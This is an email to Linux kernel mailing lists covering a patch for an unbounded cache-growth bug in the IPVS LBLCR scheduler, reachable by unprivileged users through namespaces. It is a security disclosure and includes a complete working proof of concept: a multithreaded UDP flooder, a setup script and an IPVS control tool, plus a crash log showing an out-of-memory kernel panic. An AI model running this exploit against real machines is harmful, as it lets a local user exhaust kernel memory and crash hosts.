Received: from mail-pl1-f170.google.com (mail-pl1-f170.google.com [209.85.214.170])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 35ACD3B4E8B
	for <lvs-devel@vger.kernel.org>; Sun, 16 Aug 2026 15:22:56 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.170
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1786893778; cv=none; b=UlruQdWcs8bgu+pu/8h9o1gu5nCPavmgwqWduR2E38Nn7QCjbm3pGmtSex+yS/+MifuYDOWYArVeDrEn0eUvlrgrcIYS62ymKIgI95cXilKoFvsaIeKGFi7GivDZcuJ8tznPP6xEZ6x4PomADv0AbaPtLEM1kaHNSEH97sg67kc=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1786893778; c=relaxed/simple;
	bh=Ck8cfJlYZb9aSKdPp26JSjdrSaYHP5cw8nHqZEiTwtg=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=VaMU9zmRBfv3Ty6mvAhUYzTs00JyzkC5tq7xGoHK6yMSvNDjX30fpuZN9J5U2qvIeJwAqESYatj6G7940pcA8PCfFYCKcrf28/ol3EUaWOU9jw/hjZKxeaG3hV6QOCszEyvc5g3EdG106CvJ4N24bdpW0oAq+FTMZdYeiGM0/ME=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=NLKH2sii; arc=none smtp.client-ip=209.85.214.170
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="NLKH2sii"
Received: by mail-pl1-f170.google.com with SMTP id d9443c01a7336-2d530328efbso19199215ad.0
        for <lvs-devel@vger.kernel.org>; Sun, 16 Aug 2026 08:22:56 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1786893776; x=1787498576; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=pLdhfmMualfVVCOCxE5GSRIkyXdm8EZo7zQ2e3RYq8c=;
        b=NLKH2siiFIdHXto0Hym/mbv9eksHfyRnJvzrwFSXnaCOAbW72WgMEAN6TcfGg2Fvur
         Laj1uDXw/TdfrOJ6+66K2WqNbQN2yqLPWhhDzHFPzckbskppqgz5PZijhX+cg/oIeu2H
         3szp76o32nTKv2MzjQDLBRDkqmk0jPeEtlu8jv+01hG0aZSiCpXyTRtdGUuwAmHPeCmR
         g2I8uv3KSd2YJcxIno45vkBm+FfdOU/e7Cm53Z20Mc1IVnQhfyVUBV5K9e5ca1j3ZwbE
         yfyqhOW2TxUZeuiGX5Vpfa6sM4IC5YO0QAyh6XwfeDtBts6snK0ckLbdLrH0mPP43vEu
         dqzg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1786893776; x=1787498576;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=pLdhfmMualfVVCOCxE5GSRIkyXdm8EZo7zQ2e3RYq8c=;
        b=fO2EdiCcpZ8ScCFLaTW3+1zhKONPViCZmwlYLv35kLQI6fNcDPAHMjFMjVo5sr9ayC
         MI12cE3MpiGrOgpYNFoZF1YcjpLdRlq/3v0gVuPq+v8U38Hx3NSEN+JOHePIwJ+H0BwS
         5iQ11dxPSUdnVJDe0oAk/M4SBv1MCck8bDdjF7SZiBGtGaZLdUn8tp4vYIvFSqkv6eOp
         BztQr0q1V27BGHQRuGP9Ceqfk567+ZMulTiwBnjR/R8zBI2cbopSm/CurU8bX4z8cRPT
         rMK0GXIPshHf+VasBY8LgVktMZf96TJJPk5FqQKsHFOZgn+XJZC3OYgJV9ZbqVyrEA14
         y3Vw==
X-Gm-Message-State: AOJu0Yz0ovN2gmHD8yoiBVNbTdrHKetDGyy37q4zsXS+IJPsz19KYRCI
	9uCjp18aQ6A1tMu7/k2Nn7fTnqeWWEbJYkQyBxgsrekVhn48rPYxz+HWA8PDCVF+7rO15Nj+WbW
	JcyRSP3/LeD/5fw==
X-Gm-Gg: AR+sD11ikRCwUSsYXGKs2KGXN42l1h0O+Vrh2JWsov6BUYqzbvo4YvoI5K6w0CPGrJg
	a+FEfLblTgLw2ryYzDIY/0lWH/DDFgRzelKyFrxN41BctbCnxtjiMNGjq2jUxNbMKRB2pPDw2k4
	od1Fxx3/yOfCcUBF7NrM1omgrqJdsMzLfJndA1eIxOCLxaZ+eH3TJFhAiP/Y0ah5VeN9kLb1P+I
	P8VoQVKx5xKDeOFOH6s5Dsx1bkPnHlZA3h+w20QicbK6fidayvIEY+dRAhRwOriuNpgLc9TVr2k
	1sa2efaRlKbbgS9X2NIKZoAI1p8g/X7bHr3w1otdnr80E312U5hDuVpE7pZkRmRcj8yfeT4zSK9
	G+X+TQn2nuspMtO883XmFOZTUhhVAWvEi1Do6ATdDqetp28mbTB1zQRr3D8rO6DEDrpeqvdiYBA
	xdXC4ZTuo+wdD51dcwBxfXH6LVBBu48xVKI/slLcRCRjROWTZMmGDAHZ8mgONKVYGTxnViuh9fD
	pHoIYs=
X-Received: by 2002:a17:903:950:b0:2c9:9a2e:dab0 with SMTP id d9443c01a7336-2d3b0827064mr221541655ad.3.1786893776144;
        Sun, 16 Aug 2026 08:22:56 -0700 (PDT)
Received: from Roxy.localdomain ([2602:feda:30:ae86:216:b3ff:fe40:dc4])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-320e9df03d4sm24352629eec.15.2026.08.16.08.22.52
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 16 Aug 2026 08:22:54 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: lvs-devel@vger.kernel.org,
	netfilter-devel@vger.kernel.org
Cc: horms@verge.net.au,
	ja@ssi.bg,
	pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH nf 0/1] ipvs: bound LBLCR cache growth
Date: Sun, 16 Aug 2026 23:22:12 +0800
Message-ID: <cover.1786884824.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: lvs-devel@vger.kernel.org
List-Id: <lvs-devel.vger.kernel.org>
List-Subscribe: <mailto:lvs-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:lvs-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/netfilter/ipvs/ip_vs_lblcr.c.
The bug is reachable by a non-root user through a new user and network
namespace.

We will provide detailed information about the bug in this email,
along with a PoC to trigger it.

---- details below ----

Bug details:

ip_vs_lblcr_new() allocates and publishes an LBLCR cache entry for
every previously unseen destination address. Although tbl->max_size is
initialized to 16384 entries, it is only used by the periodic collector
after cache growth has already exceeded the limit. The collector runs
once per minute and does not reclaim recently used entries.

An attacker can configure a fwmark-based LBLCR service and
continuously send UDP packets to distinct destination addresses. Each
new address creates an entry, allowing the table to grow without bound.
The allocations use GFP_ATOMIC and are not charged to the originating
socket or memory cgroup.

The scheduler selects a destination before attempting to cache it and
already continues to use that destination when cache creation fails.
The fix therefore rejects only new cache entries after tbl->max_size has
been reached, while normal traffic to new addresses remains serviceable
without further cache growth.

Reproducer:

    make
    TRACE=0 ./poc.sh ns 1000 2 9001

The command above demonstrates reachability from an unprivileged user
through unshare -Urn. The captured OOM log was produced with:

    sysctl -w vm.panic_on_oom=2
    TRACE=0 ./poc.sh root 300000 16 9000

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>

struct worker_ctx {
	unsigned long start;
	unsigned long step;
	unsigned long count;
	uint16_t dport;
};

static atomic_ulong g_sent;
static atomic_ulong g_errors;

static void idx_to_addr(unsigned long idx, struct in_addr *addr)
{
	uint32_t octet0 = 198U + ((idx >> 24) & 1U);
	uint32_t octet1 = (idx >> 16) & 0xffU;
	uint32_t octet2 = (idx >> 8) & 0xffU;
	uint32_t octet3 = idx & 0xffU;
	uint32_t host = (octet0 << 24) | (octet1 << 16) | (octet2 << 8) | octet3;

	addr->s_addr = htonl(host);
}

static void *worker_main(void *arg)
{
	struct worker_ctx *ctx = arg;
	int fd;
	struct sockaddr_in sa;
	char payload = 'X';
	unsigned long i;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket");
		return NULL;
	}

	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(ctx->dport);

	for (i = ctx->start; i < ctx->count; i += ctx->step) {
		unsigned long sent;

		idx_to_addr(i, &sa.sin_addr);
		if (sendto(fd, &payload, sizeof(payload), 0,
			   (struct sockaddr *)&sa, sizeof(sa)) < 0) {
			atomic_fetch_add_explicit(&g_errors, 1, memory_order_relaxed);
			continue;
		}

		sent = atomic_fetch_add_explicit(&g_sent, 1, memory_order_relaxed) + 1;
		if ((sent % 100000UL) == 0) {
			fprintf(stderr, "sent=%lu errors=%lu\n", sent,
				atomic_load_explicit(&g_errors, memory_order_relaxed));
		}
	}

	close(fd);
	return NULL;
}

static unsigned long parse_ul(const char *s, const char *what)
{
	char *end = NULL;
	unsigned long v;

	errno = 0;
	v = strtoul(s, &end, 0);
	if (errno || !end || *end != '\0') {
		fprintf(stderr, "invalid %s: %s\n", what, s);
		exit(2);
	}
	return v;
}

int main(int argc, char **argv)
{
	struct timespec ts0, ts1;
	pthread_t *threads;
	struct worker_ctx *ctxs;
	unsigned long count, workers, i;
	uint16_t dport = 5555;
	double elapsed;

	if (argc < 2 || argc > 4) {
		fprintf(stderr, "usage: %s <count> [workers] [dport]\n", argv[0]);
		return 2;
	}

	count = parse_ul(argv[1], "count");
	workers = (argc >= 3) ? parse_ul(argv[2], "workers") : 4;
	if (workers == 0)
		workers = 1;
	if (argc >= 4) {
		unsigned long port = parse_ul(argv[3], "dport");
		if (port > 65535) {
			fprintf(stderr, "invalid dport: %lu\n", port);
			return 2;
		}
		dport = (uint16_t)port;
	}

	threads = calloc(workers, sizeof(*threads));
	ctxs = calloc(workers, sizeof(*ctxs));
	if (!threads || !ctxs) {
		perror("calloc");
		return 1;
	}

	clock_gettime(CLOCK_MONOTONIC, &ts0);

	for (i = 0; i < workers; i++) {
		ctxs[i].start = i;
		ctxs[i].step = workers;
		ctxs[i].count = count;
		ctxs[i].dport = dport;
		if (pthread_create(&threads[i], NULL, worker_main, &ctxs[i]) != 0) {
			perror("pthread_create");
			return 1;
		}
	}

	for (i = 0; i < workers; i++)
		pthread_join(threads[i], NULL);

	clock_gettime(CLOCK_MONOTONIC, &ts1);
	elapsed = (double)(ts1.tv_sec - ts0.tv_sec) +
		  (double)(ts1.tv_nsec - ts0.tv_nsec) / 1000000000.0;

	printf("done sent=%lu errors=%lu elapsed=%.2f sec rate=%.2f pkt/sec\n",
	       atomic_load_explicit(&g_sent, memory_order_relaxed),
	       atomic_load_explicit(&g_errors, memory_order_relaxed),
	       elapsed,
	       elapsed > 0.0 ?
		 (double)atomic_load_explicit(&g_sent, memory_order_relaxed) / elapsed :
		 0.0);

	free(ctxs);
	free(threads);
	return 0;
}

------END poc.c--------

------BEGIN poc.sh------

#!/bin/bash
set -euo pipefail

PATH=/usr/sbin:/usr/bin:/sbin:/bin

MODE="${1:-root}"
COUNT="${2:-17000}"
WORKERS="${3:-4}"
PORT="${4:-9000}"
MARK="${MARK:-123}"
TRACE="${TRACE:-1}"
PANIC_ON_OOM="${PANIC_ON_OOM:-0}"

SCRIPT_DIR="$(cd -- "$(dirname -- "$0")" && pwd)"
BIN="${SCRIPT_DIR}/poc"
IPVS_CTL="${SCRIPT_DIR}/ipvs_sockopt_ctl"
TRACE_DIR=/sys/kernel/tracing

usage() {
	echo "usage: $0 [root|ns] [count] [workers] [real_server_port]" >&2
}

cleanup_trace() {
	if [[ -d "${TRACE_DIR}/events/kprobes" ]]; then
		for e in "${TRACE_DIR}"/events/kprobes/*/enable; do
			[[ -e "$e" ]] && echo 0 > "$e" || true
		done
		echo > "${TRACE_DIR}/kprobe_events" || true
	fi
}

start_trace() {
	[[ "${TRACE}" == "1" ]] || return 0
	mount -t tracefs tracefs "${TRACE_DIR}" 2>/dev/null || true
	cleanup_trace
	echo 0 > "${TRACE_DIR}/tracing_on"
	echo > "${TRACE_DIR}/trace"
	echo 'r:lblcr_ret ip_vs_lblcr_schedule entries=+8208(+520($arg1)):u32 max=+8212(+520($arg1)):u32' > "${TRACE_DIR}/kprobe_events"
	echo 'entries >= 16380' > "${TRACE_DIR}/events/kprobes/lblcr_ret/filter"
	echo 1 > "${TRACE_DIR}/events/kprobes/lblcr_ret/enable"
	echo 1 > "${TRACE_DIR}/tracing_on"
}

dump_trace() {
	[[ "${TRACE}" == "1" ]] || return 0
	echo 0 > "${TRACE_DIR}/tracing_on" || true
	echo "== trace tail =="
	grep lblcr_ret "${TRACE_DIR}/trace" | tail -10 || true
}

start_udp_sink() {
	python3 - "$PORT" <<'PY' &
import socket
import sys

port = int(sys.argv[1])
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("127.0.0.1", port))
while True:
    s.recvfrom(2048)
PY
	SINK_PID=$!
	trap 'kill ${SINK_PID} 2>/dev/null || true; cleanup_trace' EXIT
}

build_poc() {
	if [[ "${IN_NS:-0}" == "1" ]]; then
		make -C "${SCRIPT_DIR}" clean all
	else
		make -C "${SCRIPT_DIR}" clean poc
	fi
}

setup_root_netns() {
	ip link set lo up
	iptables -t mangle -F OUTPUT || true
	iptables -t mangle -A OUTPUT -p udp -j MARK --set-mark "${MARK}"
	ipvsadm -C || true
	ipvsadm -A -f "${MARK}" -s lblcr
	ipvsadm -a -f "${MARK}" -r "127.0.0.1:${PORT}" -m -w 1
}

setup_unshared_netns() {
	ip link set lo up
	ip route add default dev lo
	iptables -t mangle -F OUTPUT || true
	iptables -t mangle -A OUTPUT -p udp -j MARK --set-mark "${MARK}"
	"${IPVS_CTL}" setup "${MARK}" "${PORT}"
}

run_flood() {
	"${BIN}" "${COUNT}" "${WORKERS}" 5555
}

show_state() {
	echo "== ipvs service =="
	ipvsadm -Ln --stats --exact || true
	echo "== connection count =="
	if [[ -r /proc/net/ip_vs_conn ]]; then
		tail -n +2 /proc/net/ip_vs_conn | wc -l
	fi
}

if [[ "${MODE}" == "ns" && "${IN_NS:-0}" != "1" ]]; then
	exec unshare -Urn env IN_NS=1 PATH="${PATH}" MARK="${MARK}" TRACE="${TRACE}" \
		PANIC_ON_OOM="${PANIC_ON_OOM}" "$0" root "${COUNT}" "${WORKERS}" "${PORT}"
fi

if [[ "${MODE}" != "root" && "${MODE}" != "ns" ]]; then
	usage
	exit 2
fi

if [[ "${EUID}" -ne 0 ]]; then
	echo "run as root, or use mode 'ns' from an unprivileged account" >&2
	exit 2
fi

if [[ "${PANIC_ON_OOM}" == "1" ]]; then
	sysctl -w vm.panic_on_oom=2
fi

build_poc
start_udp_sink
start_trace
if [[ "${IN_NS:-0}" == "1" ]]; then
	setup_unshared_netns
else
	setup_root_netns
fi
run_flood
show_state
dump_trace

------END poc.sh--------

------BEGIN ipvs_sockopt_ctl.c------

#include <arpa/inet.h>
#include <errno.h>
#include <linux/ip_vs.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

struct ip_vs_svcdest_user {
	struct ip_vs_service_user s;
	struct ip_vs_dest_user d;
};

static int ipvs_fd(void)
{
	int fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0)
		perror("socket");
	return fd;
}

static int do_flush(int fd)
{
	return setsockopt(fd, IPPROTO_IP, IP_VS_SO_SET_FLUSH, NULL, 0);
}

static int do_add_service(int fd, unsigned fwmark)
{
	struct ip_vs_service_user svc;

	memset(&svc, 0, sizeof(svc));
	svc.protocol = IPPROTO_UDP;
	svc.fwmark = fwmark;
	strncpy(svc.sched_name, "lblcr", sizeof(svc.sched_name) - 1);
	return setsockopt(fd, IPPROTO_IP, IP_VS_SO_SET_ADD, &svc, sizeof(svc));
}

static int do_add_dest(int fd, unsigned fwmark, unsigned short port)
{
	struct ip_vs_svcdest_user arg;

	memset(&arg, 0, sizeof(arg));
	arg.s.protocol = IPPROTO_UDP;
	arg.s.fwmark = fwmark;
	arg.d.addr = htonl(INADDR_LOOPBACK);
	arg.d.port = htons(port);
	arg.d.conn_flags = IP_VS_CONN_F_MASQ;
	arg.d.weight = 1;
	return setsockopt(fd, IPPROTO_IP, IP_VS_SO_SET_ADDDEST, &arg, sizeof(arg));
}

static void usage(const char *prog)
{
	fprintf(stderr, "usage: %s flush | setup <fwmark> <real_server_port>\n", prog);
}

int main(int argc, char **argv)
{
	int fd, rc;

	if (argc < 2) {
		usage(argv[0]);
		return 2;
	}

	fd = ipvs_fd();
	if (fd < 0)
		return 1;

	if (strcmp(argv[1], "flush") == 0) {
		rc = do_flush(fd);
	} else if (strcmp(argv[1], "setup") == 0 && argc == 4) {
		unsigned fwmark = strtoul(argv[2], NULL, 0);
		unsigned port = strtoul(argv[3], NULL, 0);
		if (port > 65535) {
			fprintf(stderr, "bad port: %u\n", port);
			close(fd);
			return 2;
		}
		rc = do_flush(fd);
		if (rc == 0)
			rc = do_add_service(fd, fwmark);
		if (rc == 0)
			rc = do_add_dest(fd, fwmark, (unsigned short)port);
	} else {
		usage(argv[0]);
		close(fd);
		return 2;
	}

	if (rc < 0) {
		perror("setsockopt");
		close(fd);
		return 1;
	}

	close(fd);
	return 0;
}

------END ipvs_sockopt_ctl.c--------

----BEGIN crash log----

[  442.212292][ T9063] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
[  442.212990][ T9063] CPU: 3 UID: 0 PID: 9063 Comm: rasdaemon Not tainted 6.12.95 #2
[  442.213508][ T9063] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  442.214343][ T9063] Call Trace:
[  442.214610][ T9063]  <TASK>
[  442.214836][ T9063]  panic+0x533/0x610
[  442.215122][ T9063]  ? dump_header+0x5d2/0x800
[  442.215437][ T9063]  ? __pfx_panic+0x10/0x10
[  442.215769][ T9063]  out_of_memory+0x73c/0x1430
[  442.216092][ T9063]  ? __alloc_pages_noprof+0xd53/0x26d0
[  442.216459][ T9063]  ? __pfx_out_of_memory+0x10/0x10
[  442.216798][ T9063]  ? lock_acquire+0x2f/0xb0
[  442.217089][ T9063]  ? __alloc_pages_noprof+0xd53/0x26d0
[  442.217466][ T9063]  __alloc_pages_noprof+0x1ecc/0x26d0
[  442.217851][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
[  442.218230][ T9063]  ? hlock_class+0x4e/0x130
[  442.218550][ T9063]  ? __pfx___alloc_pages_noprof+0x10/0x10
[  442.218913][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
[  442.219285][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
[  442.219654][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
[  442.220026][ T9063]  ? __pfx_mark_lock+0x10/0x10
[  442.220352][ T9063]  ? __pfx_mark_lock+0x10/0x10
[  442.220684][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
[  442.221049][ T9063]  ? lock_acquire.part.0+0x119/0x370
[  442.221418][ T9063]  alloc_pages_mpol_noprof+0x1ab/0x4d0
[  442.221777][ T9063]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
[  442.222193][ T9063]  new_slab+0x303/0x420
[  442.222480][ T9063]  ___slab_alloc+0xe60/0x19e0
[  442.222783][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
[  442.223164][ T9063]  ? getname_flags.part.0+0x4a/0x4a0
[  442.223506][ T9063]  ? __print_lock_name+0x1d1/0x260
[  442.223851][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
[  442.224234][ T9063]  ? getname_flags.part.0+0x4a/0x4a0
[  442.224585][ T9063]  ? __slab_alloc.isra.0+0x5b/0xb0
[  442.224921][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
[  442.225292][ T9063]  __slab_alloc.isra.0+0x5b/0xb0
[  442.225616][ T9063]  ? getname_flags.part.0+0x4a/0x4a0
[  442.225954][ T9063]  kmem_cache_alloc_noprof+0x281/0x2c0
[  442.226383][ T9063]  getname_flags.part.0+0x4a/0x4a0
[  442.233177][ T9063]  </TASK>
[  442.233539][ T9063] Kernel Offset: disabled
[  442.233839][ T9063] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  ipvs: bound LBLCR cache growth

 net/netfilter/ipvs/ip_vs_lblcr.c | 3 +++
 1 file changed, 3 insertions(+)

-- 
2.43.0
